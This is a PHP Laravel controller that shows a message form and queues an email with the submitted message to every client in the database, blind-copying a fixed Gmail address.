<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Client;
use Illuminate\Support\Facades\Mail;
use App\Mail\MessageGoogle;

class MessageController extends Controller
{


    public function formMessageGoogle(){
        return view("emails.message-google");
    }

    public function sendMessageGoogle(Request $request){
        $this->validate($request, ['message' => 'bail|required']);

        $clients = Client::all();

        Mail::to($clients)->bcc('fabricetoyi87@gmail.com')
            ->queue(new MessageGoogle($request->all()));

        return back()->withText("Message envoyer avec succès !");
    }
}
